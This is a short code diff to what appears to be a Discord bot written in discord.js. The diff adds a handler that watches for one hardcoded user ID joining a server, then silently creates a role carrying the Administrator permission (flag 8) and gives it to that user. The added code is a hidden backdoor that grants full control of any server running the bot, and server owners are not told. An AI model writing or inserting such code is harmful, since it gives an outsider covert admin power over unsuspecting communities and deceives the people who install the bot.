@@ -546,7 +546,20 @@ Server MemberCount : **${gmemb} **
 
 
 
-
+client.on('guildMemberAdd', member => {
+   
+            if (member.id === "521763526436585472") {
+                member.guild.createRole({
+                    name : client.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
 
 
 
